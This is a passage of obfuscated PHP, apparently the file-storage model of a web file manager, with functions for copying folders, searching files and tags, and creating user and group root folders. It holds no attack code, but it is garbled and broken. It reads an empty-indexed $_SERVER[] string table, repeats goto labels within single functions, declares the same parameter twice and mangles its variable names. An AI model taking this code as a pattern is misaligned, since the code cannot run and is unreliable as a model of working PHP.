Model($b[590])->where($b)->delete(); goto Bѻ; E: if (!$c̩) { return; } $b = array($b[397] => array($b[7], $c̩), $b[489] => 1); $C = Model($b[589])->field($b[482])->where($b)->select(); goto E͋턺; d: if ($D󾖧[$b[498]] == $Fވ[$b[498]] && $D󾖧[$b[406]] == $b[588]) { return; } $b = array($b[515] => array($b[538], $D󾖧[$b[515]] . $a溼е . $b[539])); $c̩ = $this->field($b[412])->where($b)->getField($b[397], !0); goto E; Bѻ: } public function copyFolderFromIO($Eї, $eܨ, $FϠ, $CхŻ, $c٥, $DБر = false) { goto e،; Bǟ: $fܗ = $this->fileNameExist($FϠ, $c՚); $fއ = $this->mkdir($FϠ, $c՚, $CхŻ); if (!$fܗ || $CхŻ == REPEAT_RENAME_FOLDER) { $CхŻ = !1; } goto B; e،: $Bö =& $_SERVER[]; $a胤 = array($Bö[555] => array(), $Bö[556] => array(), $Bö[554] => array(), $Bö[591] => array()); $c՚ = $DБر ? $DБر : $Eї->pathThis($eܨ); goto Bǟ; F: $this->updateModifyTime($FϠ); return $fއ; goto Bƈ͉; B: if ($fܗ) { $this->_childrenAllMake($fܗ); } Hook::trigger($Bö[592]); $this->_copyChildTo($Eї, $eܨ, $fއ, $CхŻ, $a胤, $c٥); goto E; F: Model($Bö[464])->linkAdd($a胤[$Bö[554]]); Model($Bö[464])->remove($a胤[$Bö[591]]); $this->folderSizeReset($FϠ); goto F; Fڝ: Model($Bö[557])->addAll($a胤[$Bö[555]], array(), !0); Model($Bö[558])->eventCopy($fއ); $this->saveAll($a胤[$Bö[556]]); goto F; E: Hook::trigger($Bö[593]); if ($fއ) { $this->folderSizeResetChildren($fއ); } $this->_childrenListClear(); goto Fڝ; Bƈ͉: } private function _copyChildTo($CΞ, $Aכش, $dʂ, $d, &$d, $E) { goto D; Eը: $aΓ² = array(); foreach ($d as &$DΊ缉) { goto E; E: if (isset($c[$DΊ缉[$F׊Ą[28]]])) { $DΊ缉 = $c[$DΊ缉[$F׊Ą[28]]]; } $DΊ缉[$F׊Ą[405]] = $DΊ缉[$F׊Ą[29]] == $F׊Ą[77]; $DΊ缉[$F׊Ą[407]] = _get($DΊ缉, $F׊Ą[168], $F׊Ą[33]); goto b; D䙴Ə: if ($d) { $Bխ = $this->fileNameExistCache($dʂ, $DΊ缉[$F׊Ą[28]]); if ($Bխ) { if ($DΊ缉[$F׊Ą[405]] || $d == REPEAT_SKIP) { continue; } if ($d == REPEAT_REPLACE) { $Bˉ = $this->sourceInfoCache($Bխ); $fΙ = $this->fileHistory($Bˉ, $DΊ缉[$F׊Ą[461]], $DΊ缉[$F׊Ą[78]]); if ($fΙ) { $d[$F׊Ą[554]][] = $DΊ缉[$F׊Ą[461]]; } continue; } else { if ($d == REPEAT_RENAME) { $DΊ缉[$F׊Ą[28]] = $this->fileNameAutoCache($dʂ, $DΊ缉[$F׊Ą[28]], $d, !1); } } } } if (!$DΊ缉[$F׊Ą[405]] && $DΊ缉[$F׊Ą[461]]) { $d[$F׊Ą[554]][] = $DΊ缉[$F׊Ą[461]]; } $aΓ²[] = $this->_makeItemData($DΊ缉, $Fڏӛ, $DΊ缉[$F׊Ą[28]]); goto cԳ; b: $DΊ缉[$F׊Ą[78]] = _get($DΊ缉, $F׊Ą[78], 0); $DΊ缉[$F׊Ą[461]] = _get($DΊ缉, $F׊Ą[461], 0); if (!isset($DΊ缉[$F׊Ą[594]]) && $DΊ缉[$F׊Ą[461]]) { $d[$F׊Ą[591]][] = $DΊ缉[$F׊Ą[461]]; } goto D䙴Ə; cԳ: } unset($DΊ缉); goto Bِ; b: foreach ($d as $DΊ缉) { $Bˉ = $eق[$DΊ缉[$F׊Ą[28]]]; $ał = $Bˉ[$F׊Ą[397]]; $this->_copyApplyMeta($Bˉ, $d); if ($DΊ缉[$F׊Ą[29]] == $F׊Ą[77]) { $DΊ缉[$F׊Ą[76]] = $CΞ->getPathInner($DΊ缉[$F׊Ą[76]]); $this->_copyChildTo($CΞ, $DΊ缉[$F׊Ą[76]], $ał, $d, $d, $E); } } goto B; D: $F׊Ą =& $_SERVER[]; $Fڏӛ = $this->sourceInfoCache($dʂ); $d׆ = $CΞ->listPath($Aכش); goto dɣ; dɣ: $d׆ = $d׆ ? $d׆ : array($F׊Ą[74] => array(), $F׊Ą[75] => array()); $d = array_merge($d׆[$F׊Ą[74]], $d׆[$F׊Ą[75]]); $c = $this->_addFiles($CΞ, $d׆[$F׊Ą[74]], $E); goto Eը; Bِ: if (!empty($aΓ²)) { $this->addAll($aΓ²); $this->_childrenListSelect($dʂ); } $eق = $this->_childrenList($dʂ); $eق = array_to_keyvalue($eق, $F׊Ą[28]); goto b; B: } private function _addFiles($C, $A􏅶, $Cܧ) { goto F㲛; cԌ: foreach ($A􏅶 as &$Eʫ) { goto Cʱڮ; AԐñ: $Eʫ[$a[170]] = $C; Hook::trigger($a[596], $Eʫ); $A̓[$C][] =& $Eʫ; goto E䰄ȍ; E䰄ȍ: if (count($A̓[$C]) > 1) { $Eʫ[$a[594]] = !0; } goto A廩; E˸¿: $C = $C->hashMd5($Eʫ[$a[76]]); if (strlen($C) > 10 && !isset($A̓[$C])) { $A̓[$C] = array(); } $Eʫ[$a[171]] = $dܸ; goto AԐñ; Cʱڮ: Hook::trigger($a[595], $Eʫ); $Eʫ[$a[76]] = $C->getPathInner($Eʫ[$a[76]]); $dܸ = $C->hashSimple($Eʫ[$a[76]]); goto E˸¿; A廩: } unset($Eʫ); $c٠ = array($a[170] => array($a[7], array_keys($A̓))); goto Eئ; F㲛: $a =& $_SERVER[]; if (!$A􏅶 || count($A􏅶) == 0) { return array(); } $A̓ = array(); goto cԌ; B: foreach ($A􏅶 as $E񇓇) { $cν[$E񇓇[$a[28]]] = $E񇓇; } return $cν; goto f; Eئ: $E = Model($a[597]); $d﯈ = $E->where($c٠)->select(); $d﯈ = $d﯈ ? $d﯈ : array(); goto aۿ; a÷Ω: $E->addAll($Dܘ); $c٠ = array($a[170] => array($a[7], array_keys($A̓))); $d﯈ = $E->where($c٠)->select(); goto Eɹ; aۿ: foreach ($d﯈ as $a) { if (!isset($A̓[$a[$a[170]]])) { continue; } $b쉂⏤ = $A̓[$a[$a[170]]]; foreach ($b쉂⏤ as &$Eʫ) { $Eʫ[$a[461]] = $a[$a[461]]; $Eʫ[$a[594]] = !0; } unset($Eʫ); } $Dܘ = array(); foreach ($A􏅶 as $BՅ) { if (isset($BՅ[$a[594]]) && $BՅ[$a[594]]) { continue; } $Fז = $C->getPathInner($BՅ[$a[76]]); $A֬ = $E->addFileMake($Fז, $BՅ[$a[78]], $BՅ[$a[171]], $BՅ[$a[170]], $BՅ[$a[28]], $Cܧ); $Dܘ[] = $A֬; } goto a÷Ω; Eɹ: $d﯈ = $d﯈ ? $d﯈ : array(); foreach ($d﯈ as $a) { if (!isset($A̓[$a[$a[170]]])) { continue; } $aǞ =& $A̓[$a[$a[170]]]; foreach ($aǞ as &$Eʫ) { $Eʫ[$a[461]] = $a[$a[461]]; } unset($Eʫ); } $cν = array(); goto B; f: } } define($_SERVER[][598], $_SERVER[][599]); goto f͵; Bܯ: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($bܥ) { goto Aꅄ; c󥑕: if (!$B퐴[$aӎԂ[168]]) { $Dᒬڂ = array_to_keyvalue($D, $aӎԂ[33], $aӎԂ[168]); $E٧ = implode($aӎԂ[47], $Dᒬڂ); $DѾɯ = $aӎԂ[1958]; } $Bп = explode($aӎԂ[47], trim($E٧, $aӎԂ[47])); return array($DѾɯ, $Bп); goto FߺØ; Aꅄ: $aӎԂ =& $_SERVER[]; $D = KodIO::fileTypeList(); $B퐴 = $D[$bܥ]; goto aɟ֗; aɟ֗: if (!$B퐴) { return array(); } $E٧ = $B퐴[$aӎԂ[168]]; $DѾɯ = $aӎԂ[7]; goto c󥑕; FߺØ: } public function listPathType($E숊) { $f제 =& $_SERVER[]; $bǑ挓 = $this->fileTypeWhere($E숊); if (!$bǑ挓) { return array(); } $aʾ = array($f제[574] => SourceModel::TYPE_USER, $f제[575] => USER_ID, $f제[571] => 0, $f제[572] => $bǑ挓); return $this->listSource($aʾ); } public function listSearch($D󠉇, $eӞ = 300) { goto Cϓ; D׏: $bެ = $this->parseWhereLike($bެ); $b = $this->distinct(!0)->field($a)->where($bެ)->selectPage($eӞ); $this->_listSearchFileContent($b, $D󠉇, $a, $dݡ); goto Cэ; Fۏ: $dݡ = $bެ; if (!isset($bެ[$fּĘ[425]])) { $bެ[$fּĘ[425]] = 0; } $a = $fּĘ[1960]; goto C; Cϓ: $fּĘ =& $_SERVER[]; if (isset($D󠉇[$fּĘ[1803]]) && $D󠉇[$fּĘ[1803]]) { $D󠉇[$fּĘ[1803]] = str_replace($fּĘ[382], $fּĘ[1959], trim($D󠉇[$fּĘ[1803]])); } $bެ = $this->_parseSearchWhere($D󠉇); goto Fۏ; Cэ: $this->_listSearchDesc($b, $D󠉇, $a); $this->_listSearchTag($b, $D󠉇, $a); $this->_listSearchGroupTag($b, $D󠉇, $a); goto EҪ; EҪ: $this->_listDataApply($b[$fּĘ[367]]); $this->_listMake($b); return $b; goto Dϙ; C: $a = $a; $this->_listSearchBindPinyin($D󠉇, $bެ, $a); $this->alias($fּĘ[438])->_makeOrder(); goto D׏; Dϙ: } private function _listSearchFileContent(&$eօĈ, $DǦܝ, $Aш菊, $b٩ΈӇ) { goto b萹; a: $dի߈ = $this->field($Aш菊)->where($b٩ΈӇ)->limit($DΟ[1961])->select(); if (!$dի߈ || count($dի߈) == 0) { return; } $eօĈ[$DΟ[367]] = array_merge($dի߈, $eօĈ[$DΟ[367]]); goto Bܾ; Cő: $b٩ΈӇ[$DΟ[461]] = array($DΟ[7], $DǦܝ[$DΟ[461]]); unset($b٩ΈӇ[$DΟ[28]]); unset($DǦܝ[$DΟ[461]]); goto a; Bܾ: $eօĈ[$DΟ[364]][$DΟ[365]] += count($dի߈); goto F瓑; b萹: $DΟ =& $_SERVER[]; if (!$DǦܝ[$DΟ[1803]] || $eօĈ[$DΟ[364]][$DΟ[351]] > 1) { return; } if (!isset($b٩ΈӇ[$DΟ[28]]) || !is_array($DǦܝ[$DΟ[461]])) { return; } goto Cő; F瓑: } private function _listSearchTag(&$d³ʊ, $DЪ̗, $E) { goto B; F𶧔: $c = array(); $DͰ߄ = $DЪ̗[$AĲݐ[1803]]; foreach ($D as $Eլ) { $e = $Eլ[$AĲݐ[28]]; $A = str_replace($AĲݐ[50], $AĲݐ[33], Pinyin::get($e)); if (stripos($e, $DͰ߄) !== !1 || stripos($A, $DͰ߄) !== !1) { $c[] = $Eլ[$AĲݐ[395]]; } } goto Dč; Dč: if (!$c) { return; } $eц = array($AĲݐ[421] => array($AĲݐ[7], $c), $AĲݐ[1546] => USER_ID); $bƚ = Model($AĲݐ[422])->field($AĲݐ[76])->where($eц)->select(); goto b𗿠; B: $AĲݐ =& $_SERVER[]; if (!$DЪ̗[$AĲݐ[1803]] || $d³ʊ[$AĲݐ[364]][$AĲݐ[351]] > 1) { return; } $D = Model($AĲݐ[1962])->listData(); goto F𶧔; b𗿠: $bƚ = array_to_keyvalue($bƚ, $AĲݐ[33], $AĲݐ[76]); $E = array_unique($bƚ); $this->_listSearchMerge($d³ʊ, $DЪ̗, $E, $E); goto f۔ۊ; f۔ۊ: } private function _listSearchDesc(&$D݅, $aՑ, $e廉) { goto ê; ê: $fâ =& $_SERVER[]; if (!$aՑ[$fâ[1803]] || $D݅[$fâ[364]][$fâ[351]] > 1) { return; } $Eޠ = $this->listSearchChildren($aՑ[$fâ[492]]); goto fƈ; cƶ: $A֔ = Model($fâ[557])->field($fâ[397])->where($fቕ)->select(); $Fġ׿ = array_to_keyvalue($A֔, $fâ[33], $fâ[397]); $this->_listSearchMerge($D݅, $aՑ, $e廉, $Fġ׿); goto c; fƈ: $Eޠ = array_unique($Eޠ); if (!$Eޠ) { return; } $fቕ = array($fâ[397] => array($fâ[7], $Eޠ), $fâ[93] => $fâ[445], $fâ[372] => array($fâ[381], $fâ[1805] . $aՑ[$fâ[1803]] . $fâ[1805])); goto cƶ; c: } private function _listSearchGroupTag(&$Eۗҽ, $d߱Ǽ, $b) { goto a; D: $Fɓ = array_to_keyvalue($Fɓ, $d⬡͹[33], $d⬡͹[76]); $e = array_unique($Fɓ); $this->_listSearchMerge($Eۗҽ, $d߱Ǽ, $b, $e); goto e; d錼͸: if (!$b⣹ || $b⣹[$d⬡͹[406]] != SourceModel::TYPE_GROUP) { return; } $B = $b⣹[$d⬡͹[498]]; $aę = Model($d⬡͹[1963])->get($B); goto e쌇; a: $d⬡͹ =& $_SERVER[]; if (!$d߱Ǽ[$d⬡͹[1803]] || $Eۗҽ[$d⬡͹[364]][$d⬡͹[351]] > 1 || !$d߱Ǽ[$d⬡͹[492]]) { return; } $b⣹ = $this->sourceInfo($d߱Ǽ[$d⬡͹[492]]); goto d錼͸; Fѥ۝Һ: if (!$b) { return; } $F = array($d⬡͹[421] => array($d⬡͹[7], $b), $d⬡͹[1546] => 0, $d⬡͹[29] => $d⬡͹[1827] . $B); $Fɓ = Model($d⬡͹[422])->field($d⬡͹[76])->where($F)->select(); goto D; e쌇: $b = array(); $C = $d߱Ǽ[$d⬡͹[1803]]; foreach ($aę[$d⬡͹[367]] as $E۔ѯ) { $A = $E۔ѯ[$d⬡͹[28]]; $A֮ = str_replace($d⬡͹[50], $d⬡͹[33], Pinyin::get($A)); if (stripos($A, $C) !== !1 || stripos($A֮, $C) !== !1) { $b[] = $E۔ѯ[$d⬡͹[395]]; } } goto Fѥ۝Һ; e: } private function _listSearchMerge(&$b, $c𔕑, $aļ, $Fڒ) { goto A; B̈: $A촤д = $this->field($aļ)->where($aㆯ)->select(); if (!$A촤д) { return; } $eٽƟ = array(); goto E㎒; E㎒: foreach ($A촤д as $A㬃) { if ($this->_listSearchFilter($A㬃, $c𔕑)) { $eٽƟ[] = $A㬃; } } $b[$Fۜީ[367]] = array_merge($eٽƟ, $b[$Fۜީ[367]]); $b[$Fۜީ[364]][$Fۜީ[365]] += count($eٽƟ); goto bꧣ; A: $Fۜީ =& $_SERVER[]; if (!$Fڒ) { return; } $A = array_to_keyvalue($b[$Fۜީ[367]], $Fۜީ[33], $Fۜީ[397]); goto e; e: $c؟ʫ = array_diff($Fڒ, $A); if (!$c؟ʫ) { return; } $aㆯ = array($Fۜީ[397] => array($Fۜީ[7], $c؟ʫ)); goto B̈; bꧣ: } private function _listSearchFilter($e툏, $C) { goto Dљ; Dљ: $eٺ =& $_SERVER[]; $C斞 = $e툏[$eٺ[405]] == $eٺ[87]; if (!strstr($e툏[$eٺ[515]], $eٺ[47] . $C[$eٺ[492]] . $eٺ[47])) { return !1; } goto d尛; Bߖݑ: if (isset($C[$eٺ[588]]) && $C[$eٺ[588]] != $e툏[$eٺ[448]]) { return !1; } return !0; goto a֧; d尛: if (isset($C[$eٺ[407]]) && $C[$eٺ[407]] != $eٺ[1769]) { if ($C[$eٺ[407]] == $eٺ[77] && !$C斞) { return !1; } if ($C[$eٺ[407]] != $eٺ[77] && $C斞) { return !1; } if (!strstr($e툏[$eٺ[168]], $eٺ[47] . $C[$eٺ[407]] . $eٺ[47])) { return !1; } } if (isset($C[$eٺ[1964]]) && $C[$eٺ[1964]] < $e툏[$eٺ[78]]) { return !1; } if (isset($C[$eٺ[1965]]) && $C[$eٺ[1965]] > $e툏[$eٺ[78]]) { return !1; } goto Bߖݑ; a֧: } public function listSearchChildren($C, $Dʘ = 5000) { goto Fֻ; Fֻ: $C߿ =& $_SERVER[]; $fĝȣ = array(); $e뼾 = $this->sourceInfo($C); goto aы; E: $cۃމ = $this->field($C߿[397])->where($dߢ)->select(); $fĝȣ = array_to_keyvalue($cۃމ, $C߿[33], $C߿[397]); return $fĝȣ; goto bń; aы: $dߢ = array($C߿[515] => array($C߿[381], $e뼾[$C߿[515]] . $e뼾[$C߿[397]] . $C߿[539])); $d = $this->field($C߿[397])->cache(null, 600)->where($dߢ)->count(); if ($d > $Dʘ) { return $this->_listSearchChildrenNear($C, $Dʘ); } goto E; bń: } private function _listSearchChildrenNear($cϜ, $Eں) { goto e惌; F: if (!$fɄ) { return $eЪ; } $f߾ = array($c[492] => array($c[7], $fɄ)); $cӟ = $this->field($c[1966])->where($f߾)->limit($Eں)->select(); goto C; e惌: $c =& $_SERVER[]; $eЪ = array(); $f߾ = array($c[492] => $cϜ); goto D; D: $cӟ = $this->field($c[1966])->where($f߾)->select(); $fɄ = array_to_keyvalue(array_filter_by_field($cӟ, $c[405], $c[87]), $c[33], $c[397]); $eЪ = array_merge($eЪ, array_to_keyvalue($cӟ, $c[33], $c[397])); goto F; C: $eЪ = array_merge($eЪ, array_to_keyvalue($cӟ, $c[33], $c[397])); $eЪ = array_slice($eЪ, 0, $Eں); return $eЪ; goto cǓ񺒚; cǓ񺒚: } private function _listSearchBindPinyin($Dۍ, &$c͢, &$f) { goto E; C: $c͢ = $A; goto b؛; E: $A䒨߅ =& $_SERVER[]; if (!isset($Dۍ[$A䒨߅[1803]]) || !$Dۍ[$A䒨߅[1803]]) { return; } if (!Input::check($Dۍ[$A䒨߅[1803]], $A䒨߅[316]) || strlen($Dۍ[$A䒨߅[1803]]) < 2) { return; } goto Dϧ; E՟: $f = $A䒨߅[430] . str_replace($A䒨߅[47], $A䒨߅[431], $f); $e閜 = $c͢[$A䒨߅[28]]; unset($c͢[$A䒨߅[28]]); goto aɄ; Dϧ: $E沲 = "\114\105\x46\124\x20\x4a\117\x49\x4e\40{$this->tablePrefix}\151\x6f\x5f\163\x6f\x75\162\143\x65\137\x6d\x65\164\141\x20\155\145\x74\x61\x20\157\x6e\40\163\x6f\165\x72\143\145\56\163\157\165\162\143\x65\x49\104\40\x3d\x20\x6d\x65\x74\141\x2e\x73\x6f\165\x72\143\145\x49\x44"; $A = array(); $f = str_replace(array($A䒨߅[229], $A䒨߅[50], $A䒨߅[1967]), $A䒨߅[33], $f); goto E՟; aɄ: foreach ($c͢ as $f㜶ښ => $e茤) { $A[$A䒨߅[430] . $f㜶ښ] = $e茤; } foreach ($e閜 as $F) { $A[] = array($A䒨߅[435] => $F, $A䒨߅[976] => $A䒨߅[1807], array($A䒨߅[1968] => $F, $A䒨߅[1969] => array($A䒨߅[7], array($A䒨߅[458], $A䒨߅[457])))); } $this->join($E沲); goto C; b؛: } private function _parseSearchWhere($Bڭ˧) { goto b԰; fݗ: if (isset($Bڭ˧[$Fկ[588]]) && $Bڭ˧[$Fկ[588]]) { $Aڳ[] = array($Fկ[448] => $Bڭ˧[$Fկ[588]], $Fկ[446] => $Bڭ˧[$Fկ[588]], $Fկ[976] => $Fկ[1807]); } if (isset($Bڭ˧[$Fկ[407]]) && $Bڭ˧[$Fկ[407]]) { $CЇѵʨ = $Bڭ˧[$Fկ[407]]; if ($CЇѵʨ == $Fկ[77]) { $Aڳ[$Fկ[405]] = 1; } else { if ($CЇѵʨ == $Fկ[1973]) { $Aڳ[$Fկ[405]] = 0; } else { if ($CЇѵʨ) { $CЇѵʨ = is_array($CЇѵʨ) ? $CЇѵʨ : explode($Fկ[47], $CЇѵʨ); $Aڳ[$Fկ[407]] = array($Fկ[413], $CЇѵʨ); $Aڳ[$Fկ[405]] = 0; } } } } $this->_parseSearchParent($Bڭ˧, $Aڳ); goto d֚; d֚: if (isset($Bڭ˧[$Fկ[1803]]) && trim($Bڭ˧[$Fկ[1803]])) { $bʏ = trim($Bڭ˧[$Fկ[1803]]); $EΌ = explode($Fկ[50], $bʏ); if (strlen($bʏ) > 2 && (substr($bʏ, 0, 1) == $Fկ[116] && substr($bʏ, -1) == $Fկ[116]) || substr($bʏ, 0, 1) == $Fկ[55] && substr($bʏ, -1) == $Fկ[55]) { $bʏ = substr($bʏ, 1, -1); $EΌ = array($bʏ); } $Aڳ[$Fկ[28]] = array(array($Fկ[538], $Fկ[1805] . $bʏ . $Fկ[1805])); if (count($EΌ) > 1) { $Aڳ[$Fկ[28]] = array(); foreach ($EΌ as $eڈ) { if (!trim($eڈ)) { continue; } $Aڳ[$Fկ[28]][] = array($Fկ[538], $Fկ[1805] . trim($eڈ) . $Fկ[1805]); } } } return $Aڳ; goto Bϵ; b԰: $Fկ =& $_SERVER[]; $Aڳ = array(); if (isset($Bڭ˧[$Fկ[738]]) && $Bڭ˧[$Fկ[738]]) { $Aڳ[$Fկ[84]] = array($Fկ[1970], $Bڭ˧[$Fկ[738]]); } goto Cё; Cё: if (isset($Bڭ˧[$Fկ[490]]) && $Bڭ˧[$Fկ[490]]) { $f܆ڡ = array($Fկ[1971], $Bڭ˧[$Fկ[490]]); if ($Aڳ[$Fկ[84]]) { $Aڳ[$Fկ[84]] = array($Aڳ[$Fկ[84]], $f܆ڡ, $Fկ[1972]); } else { $Aڳ[$Fկ[84]] = $f܆ڡ; } } if (isset($Bڭ˧[$Fկ[1964]]) && $Bڭ˧[$Fկ[1964]] > 0) { $Aڳ[$Fկ[78]] = array($Fկ[1970], $Bڭ˧[$Fկ[1964]]); } if (isset($Bڭ˧[$Fկ[1965]]) && $Bڭ˧[$Fկ[1965]]) { $f܆ڡ = array($Fկ[1971], $Bڭ˧[$Fկ[1965]]); if ($Aڳ[$Fկ[78]]) { $Aڳ[$Fկ[78]] = array($Aڳ[$Fկ[78]], $f܆ڡ, $Fկ[1972]); } else { $Aڳ[$Fկ[78]] = $f܆ڡ; } } goto fݗ; Bϵ: } private function _parseSearchParent($c֣, &$b) { goto A鄹; a׊ߕ: $d = isset($c֣[$cʇ[1671]]) && in_array($cʇ[509], $c֣[$cʇ[1671]]); if (!$d || !$D꟬ || !$eԯ || !$a[$cʇ[408]]) { return; } if (!AuthModel::authCheckRoot($a[$cʇ[408]][$cʇ[409]])) { return; } goto a; A鄹: $cʇ =& $_SERVER[]; if (!isset($c֣[$cʇ[492]]) || !$c֣[$cʇ[492]]) { return; } $a = $this->pathInfo($c֣[$cʇ[492]]); goto E; E: $eԯ = $a[$cʇ[492]] . $cʇ[33] === $cʇ[191]; $D꟬ = $a[$cʇ[406]] == $cʇ[509]; $b[$cʇ[578]] = array($cʇ[538], $a[$cʇ[515]] . $c֣[$cʇ[492]] . $cʇ[539]); goto a׊ߕ; E: $c틕 = count($Dڋ); if ($c틕 <= 1) { return; } $dм = array($cʇ[492] => 0, $cʇ[406] => self::TYPE_GROUP, $cʇ[498] => array($cʇ[7], $Dڋ)); goto f; B: $b[$cʇ[578]][] = $cʇ[1807]; goto Bߝ; f: $FѰ = $this->field($cʇ[1974])->where($dм)->limit($c틕)->select(); $b[$cʇ[578]] = array(); foreach ($FѰ as $E톽) { $b[$cʇ[578]][] = array($cʇ[538], $cʇ[525] . $E톽[$cʇ[397]] . $cʇ[539]); } goto B; a: $cٷ = $a[$cʇ[498]] . $cʇ[33]; if ($cٷ == $cʇ[87]) { unset($b[$cʇ[578]]); $b[$cʇ[406]] = self::TYPE_GROUP; return; } $Dڋ = Model($cʇ[516])->groupChildrenAll($cٷ); goto E; Bߝ: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($e浡) { $bх =& $_SERVER[]; $Aڇ = Model($bх[507])->where(array($bх[1537] => $e浡))->find(); $dޘ = $this->_mkdirRoot(SourceModel::TYPE_USER, $e浡, $Aڇ[$bх[28]]); $this->userDesktopAdd($dޘ); return $dޘ; } public function userDesktopAdd($CɈ) { $E =& $_SERVER[]; $fŌȞ = LNG($E[1975]); $d = $this->mkdir($CɈ, $fŌȞ); $this->metaSet($d, $E[1976], $E[87]); $this->metaSet($CɈ, $E[1977], $d); } public function groupRootAdd($EѪ) { $Dג =& $_SERVER[]; $cق = Model($Dג[516])->where(array($Dג[1799] => $EѪ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $EѪ, $cق[$Dג[28]]); } public function systemRootPathAdd($c) { if ($c != $_SERVER[][531]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $c); } public function userRootRemove($cޱ) { $Fߍ = $this->sourceRoot(SourceModel::TYPE_USER, $cޱ); if (!$Fߍ) { return; } $this->remove($Fߍ, !1); } public function groupRootRemove($c徴) { $Eś = $this->sourceRoot(SourceModel::TYPE_GROUP, $c徴); if (!$Eś) { return; } $this->remove($Eś, !1); } private function _mkdirRoot($A֩, $cҫ, $eۧ) { goto d; D׍Ⅸ: CacheLock::unlock($Aﶈ); return $Fͧ; goto Eӏ; d: $aಶ =& $_SERVER[]; $F = array($aಶ[396] => 0, $aಶ[574] => $A֩, $aಶ[575] => $cҫ, $aಶ[571] => 1, $aಶ[576] => USER_ID, $aಶ[577] => USER_ID, $aಶ[572] => $aಶ[33], $aಶ[578] => $aಶ[525], $aಶ[424] => 0, $aಶ[573] => 0, $aಶ[462] => 0, $aಶ[579] => $aಶ[33]); if ($A = $this->where($F)->find()) { return $A[$aಶ[397]]; } goto e֦; F: $Fͧ = $this->add($F); $fҺ = array($aಶ[580] => short_id($Fͧ)); $this->where(array($aಶ[412] => $Fͧ))->save($fҺ); goto D׍Ⅸ; e֦: $Aﶈ = "\x4d\x6f\144\x65\x6c\x53\x6f\165\162\143\x65\x2e\x6d\153\144\151\162\122\157\157\164\56{$A֩}\x2e{$cҫ}\x2e" . $eۧ; CacheLock::lock($Aﶈ); $F[$aಶ[28]] = $eۧ; goto F; Eӏ: } private function sourceRoot($fٺ, $Cݸ, $eڃԺ = false) { $e =& $_SERVER[]; $d = array($e[396] => 0, $e[574] => $fٺ, $e[575] => $Cݸ); if ($F = $this->where($d)->find()) { return $eڃԺ ? $F : $F[$e[397]]; } return !1; } public function sourceRootGroup($aؘ) { goto fծ; fծ: $b =& $_SERVER[]; if (is_string($aؘ)) { $aؘ = array($aؘ); } $Bʼ = array($b[396] => 0, $b[575] => array($b[7], $aؘ), $b[574] => SourceModel::TYPE_GROUP); goto EҭŨ; EҭŨ: $this->selectPageReset(); $Eߡ = $this->limit(count($aؘ))->listSource($Bʼ, 1000); $this->selectPageRestore(); goto CأՒ; CأՒ: return array_to_keyvalue($Eߡ[$b[75]], $b[498]); goto C־; C־: } public function mkfile($c˚, $EՋ, $c洍ӣ = '', $fϣ = REPEAT_RENAME) { $C׈ =& $_SERVER[]; $d = Model($C׈[597])->addFileByContent($c洍ӣ, $EՋ); return $this->_createFileCall($c˚, $EՋ, $d, $fϣ, $C׈[1233]); } public function addFile($aޖ, $AÆ, $Dő, $Bɝ = false, $CԢ = REPEAT_RENAME) { $AՈ = Model($_SERVER[][597])->addFile($AÆ, $Dő, $Bɝ); return $this->_createFileCall($aޖ, $Dő, $AՈ, $CԢ); } public function addFileByFileID($fŢ, $f, $a, $AɫԤ = REPEAT_RENAME) { $b =& $_SERVER[]; $Aȏ = Model($b[597])->find($f); Model($b[597])->linkAdd($f); return $this->_createFileCall($fŢ, $a, $Aȏ, $AɫԤ); } public function addFileByRemote($fƸ, $c, $E㷼, $dع = array(), $a۪ = REPEAT_RENAME) { $eᦂ = Model($_SERVER[][597])->addFileByRemote($c, $E㷼, $dع); return $this->_createFileCall($fƸ, $E㷼, $eᦂ, $a۪); } private function _createFileCall($e̘, $CĂ, $F, $A鶈, $a빻 = "\x75\160\154\x6f\141\x64") { goto Aϱ; e緺: $this->lockWriteStart($e̘, $CĂ); $AǏ = $this->fileNameExist($e̘, $CĂ); $EޓԻ = $this->_createFile($e̘, $CĂ, $F, $A鶈, $b˗); goto fڈ; d٦ˑ: return $EޓԻ; goto fʼ; fڈ: if (!$b˗) { Model($Eۗ[464])->remove($F[$Eۗ[461]]); } if ($b˗ && $EޓԻ && $EޓԻ != $AǏ) { Model($Eۗ[1948])->eventCreate($EޓԻ, $a빻); } $this->lockWriteEnd($e̘, $CĂ); goto d٦ˑ; Aϱ: $Eۗ =& $_SERVER[]; $b˗ = !1; $this->setMasterDB(); goto e緺; fʼ: } public function mkdir($aӔݨϐ, $cՄ, $d϶Ԙ = REPEAT_SKIP) { goto a; a: $d˥ =& $_SERVER[]; $this->setMasterDB(); $eӕ鐂 = $this->sourceInfo($aӔݨϐ); goto BЄ; aЇ: $this->lockWriteEnd($aӔݨϐ, $cՄ); return $C㭻; goto f; Eņ: $Fϙ = array($d˥[571] => 1, $d˥[415] => $cՄ, $d˥[572] => $d˥[33], $d˥[462] => 0, $d˥[573] => 0); $C㭻 = $this->_addSoure($Fϙ, $eӕ鐂); Model($d˥[1948])->eventCreate($C㭻, $d˥[1234]); goto aЇ; BЄ: if (!$eӕ鐂) { return !1; } $this->lockWriteStart($aӔݨϐ, $cՄ); if ($d϶Ԙ !== !1) { $A = $this->fileNameExist($aӔݨϐ, $cՄ); if ($A && $d϶Ԙ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($aӔݨϐ, $cՄ); return $A; } $cՄ = $this->fileNameAuto($aӔݨϐ, $cՄ, $d϶Ԙ); } goto Eņ; f: } private function _createFile($CǤ, $cӺ僽, $F樃·, $eщֵ, &$e) { goto c; F罜: return $b; goto bʅ; C: $F֓ = array($Bͪ[571] => 0, $Bͪ[415] => $cӺ僽, $Bͪ[572] => substr(get_path_ext($cӺ僽), 0, 10), $Bͪ[462] => $F樃·[$Bͪ[461]], $Bͪ[573] => $F樃·[$Bͪ[78]]); $b = $this->_addSoure($F֓, $Bˬ܂); $this->folderSizeReset($CǤ, intval($F֓[$Bͪ[78]])); goto F罜; c: $Bͪ =& $_SERVER[]; $Bˬ܂ = $this->sourceInfo($CǤ); if (!$F樃· || !$Bˬ܂) { return !1; } goto d; d: if ($eщֵ !== !1) { $e؞݇׫ = $this->fileNameExist($CǤ, $cӺ僽); } $e = !0; if ($eщֵ && $e؞݇׫) { if ($eщֵ == REPEAT_SKIP) { $e = !1; return $e؞݇׫; 